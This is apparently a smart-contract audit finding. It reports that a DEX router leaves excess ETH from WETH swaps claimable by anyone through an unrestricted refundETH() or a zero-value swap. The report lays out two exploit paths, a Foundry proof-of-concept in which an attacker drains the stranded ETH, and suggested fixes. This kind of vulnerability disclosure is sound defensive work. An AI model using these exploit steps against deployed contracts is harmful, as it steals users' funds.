Audit Report

## Title
Excess ETH Stranded in Router After WETH Swap Is Claimable by Any Caller — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
When a user calls any `payable` swap function (e.g., `exactInputSingle`) with `tokenIn = WETH` and `msg.value > amountIn`, the `pay` function wraps only `amountIn` worth of ETH and leaves the remainder in the router. No automatic refund occurs. Any subsequent caller can steal the stranded ETH by calling `refundETH()` directly, or by submitting a WETH swap with `msg.value = 0` that is funded by the victim's leftover balance.

## Finding Description

**Root cause — `pay` uses `address(this).balance`, not `msg.value`.**

In `PeripheryPayments.sol`, the WETH branch of `pay` reads the router's total native balance: [1](#0-0) 

When `nativeBalance >= value`, only `value` (i.e., `amountIn`) is wrapped and forwarded. Any ETH above `amountIn` remains in the router.

**No automatic refund in `exactInputSingle`.**

`exactInputSingle` is `payable` but returns without calling `refundETH()`: [2](#0-1) 

**`refundETH()` has zero access control.** [3](#0-2) 

Any EOA or contract can call `refundETH()` and receive the entire router ETH balance, including ETH stranded by prior callers.

**Exploit path A — direct theft via `refundETH()`:**
1. Victim calls `exactInputSingle(tokenIn=WETH, amountIn=100, msg.value=200)`.
2. `pay` wraps 100 ETH; 100 ETH remains in the router.
3. Attacker calls `refundETH()` → receives 100 ETH.

**Exploit path B — zero-value WETH swap funded by victim's ETH:**
1. Same setup; 100 ETH stranded in router.
2. Attacker calls `exactInputSingle(tokenIn=WETH, amountIn=100, msg.value=0)`.
3. In the callback, `pay(WETH, attacker, pool, 100)` fires; `address(this).balance == 100 >= 100`, so the router wraps the victim's ETH and pays for the attacker's swap.
4. Attacker receives swap output tokens for free.

Note: the `receive()` guard (`if (msg.sender != WETH) revert NotWETH()`) does not block this — it only applies to bare ETH transfers, not to ETH attached to a `payable` function call. [4](#0-3) 

## Impact Explanation
Direct loss of user principal. Any ETH sent in excess of `amountIn` during a WETH swap is permanently claimable by any third party via a public, unprivileged call. The victim has no recovery path once a subsequent caller claims the stranded ETH. This is a High-severity direct loss of user funds.

## Likelihood Explanation
High. Users routinely send a round `msg.value` slightly above `amountIn` to ensure the swap succeeds, especially when `amountIn` is computed off-chain. The attack requires only a single permissionless call (`refundETH()` or a zero-value WETH swap) and can be executed by any EOA or MEV bot watching the mempool. No special privileges, no malicious pool, and no non-standard tokens are required.

## Recommendation
1. **Automatic per-call refund:** At the end of each `payable` swap function, refund `address(this).balance` back to `msg.sender` (or track `msg.value` at entry and refund the unconsumed portion).
2. **Restrict `refundETH()`:** If the design intent is that `refundETH()` is always bundled in a `multicall`, enforce that it can only be called via `delegatecall` from `multicall`, or add a reentrancy-safe "current beneficiary" slot set at swap entry and cleared at exit so `refundETH()` always returns funds to the original swap initiator.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;
import "forge-std/Test.sol";

contract ExcessETHStrandedTest is Test {
    MetricOmmSimpleRouter router;
    address weth;
    address pool;
    address victim  = address(0xBEEF);
    address attacker = address(0xBAD);

    function testExcessETHStolen() public {
        // Victim swaps 100 WETH but sends 200 ETH
        vm.deal(victim, 200 ether);
        vm.prank(victim);
        router.exactInputSingle{value: 200 ether}(
            IMetricOmmSimpleRouter.ExactInputSingleParams({
                pool: pool, tokenIn: weth, recipient: victim,
                amountIn: 100 ether, amountOutMinimum: 0,
                zeroForOne: true, priceLimitX64: 0,
                deadline: block.timestamp + 1, extensionData: ""
            })
        );

        // 100 ETH is now stranded in the router
        assertEq(address(router).balance, 100 ether);

        // Attacker calls refundETH() with no prior interaction
        vm.prank(attacker);
        router.refundETH();

        assertEq(attacker.balance, 100 ether);
        assertEq(address(router).balance, 0);
    }
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-84)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```
